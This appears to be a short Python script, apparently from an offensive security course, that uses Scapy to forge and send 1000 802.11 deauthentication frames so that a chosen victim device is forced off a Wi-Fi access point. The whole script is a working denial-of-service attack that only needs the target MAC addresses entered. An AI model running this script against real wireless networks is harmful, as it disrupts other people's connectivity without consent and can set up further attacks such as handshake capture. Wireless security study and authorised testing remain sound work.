# Offensive Security Software
# SSE Program
# Attack: Deauthenticate User from AP
# Date: January 31, 2016
# Description:  To deauthentiate a user/node from an AP

from scapy.all import *
import sys

interface = "mon0"
BSSID = raw_input("Enter the MAC of AP ")
victim_mac = raw_input("Enter the MAC of Victim ")

frame= RadioTap()/ Dot11(addr1=victim_mac,addr2=BSSID, addr3=BSSID)/ Dot11Deauth()
sendp(frame,iface=interface, count= 1000, inter= .1)
